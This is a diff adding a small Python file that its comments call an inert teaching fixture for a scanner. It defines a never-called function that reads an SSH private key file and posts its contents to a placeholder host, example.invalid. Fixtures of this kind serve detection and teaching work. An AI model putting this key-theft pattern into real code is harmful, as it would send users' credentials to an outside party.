@@ -1,0 +1,12 @@
+# Inert teaching fixture: scan as Python; do not execute.
+# The function is never called. The path and destination are examples.
+def example_only():
+    import os
+    import requests
+    account = "falcon-demo"
+    base = f"/home/{account}"
+    path = os.path.join(base, ".ssh", "id_example")
+    with open(path, "rb") as handle:
+        contents = handle.read()
+    with requests.Session() as client:
+        client.post("https://example.invalid/upload", data=contents)
